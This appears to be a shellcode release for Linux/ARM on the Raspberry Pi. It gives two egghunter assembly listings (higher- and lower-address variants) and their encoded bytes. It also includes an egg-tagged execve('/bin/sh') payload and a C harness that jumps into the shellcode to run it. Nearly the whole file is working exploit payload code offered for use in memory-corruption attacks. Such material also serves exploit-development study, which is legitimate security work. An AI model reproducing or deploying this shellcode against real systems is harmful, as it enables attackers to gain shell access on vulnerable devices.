/*
Linux/ARM (Raspberry Pi) - Egghunter + /bin/sh Shellcode (32 bytes)

------------------------------
// If your shellcode in higer address, use following egghunter.
pi@raspberrypi:~ $ cat egghunter-higher.s
.section .text
.global _start
    _start:
    .code 32
    add r3, pc, #1      // switch to thumb mode
    bx r3

    .code 16
    adr r1, startpoint  // set r1 to start point address
    ldr r2, egg         // set r2 to egg's value

    next_addr:
    add r1, r1, #1      // increment scan address
    ldr r3, [r1]        // set r3 to the value stored in r1's address
    cmp r2, r3          // compare values
    bne next_addr       // if failed to find egg, jump to next address

    mov r3, pc          // switch to arm mode
    bx r3

    .code 32
    mov pc, r1          // jump to found address

egg:
.ascii "\x50\x90\x50\x90"
startpoint:

pi@raspberrypi:~ $

------------------------------
// If your shellcode in lower address, use following egghunter.
pi@raspberrypi:~ $ cat egghunter-lower.s
.section .text
.global _start
    _start:
    .code 32
    add r3, pc, #1      // switch to thumb mode
    bx r3

    .code 16
    adr r1, startpoint  // set r1 to start point address
    ldr r2, egg         // set r2 to egg's value

    next_addr:
    sub r1, r1, #1      // increment scan address
    ldr r3, [r1]        // set r3 to the value stored in r1's address
    cmp r2, r3          // compare values
    bne next_addr       // if failed to find egg, jump to next address

    startpoint:
    mov r3, pc          // switch to arm mode
    bx r3

    .code 32
    mov pc, r1          // jump to found address

egg:
.ascii "\x50\x90\x50\x90"

pi@raspberrypi:~ $

------------------------------
*/

#include <stdio.h>
#include <string.h>

// If your shellcode in higer address, use following egghunter.
unsigned char egghunter[] = \
"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x05\xa1\x04\x4a\x01\x31\x0b\x68\x9a\x42\xfb\xd1\x7b\x46\x18\x47\x01\xf0\xa0\xe1\x50\x90\x50\x90";

unsigned char egg[] = \
"\x50\x90\x50\x90" // egg tag
"\x01\x30\x8f\xe2\x13\xff\x2f\xe1" // execve('/bin/sh')
"\x49\x40\x52\x40\x01\xa0\xc2\x71"
"\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
"\x2f\x73\x68\x41";

// If your shellcode in lower address, use following egghunter.
//unsigned char egghunter[] = \
//"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa1\x04\x4a\x01\x39\x0b\x68\x9a\x42\xfb\xd1\x7b\x46\x18\x47\x01\xf0\xa0\xe1\x50\x90\x50\x90";

void main()
{
    printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
    printf("Egg shellcode Length:  %d\n", strlen(egg));

    int (*ret)() = (int(*)())egghunter;

    ret();
}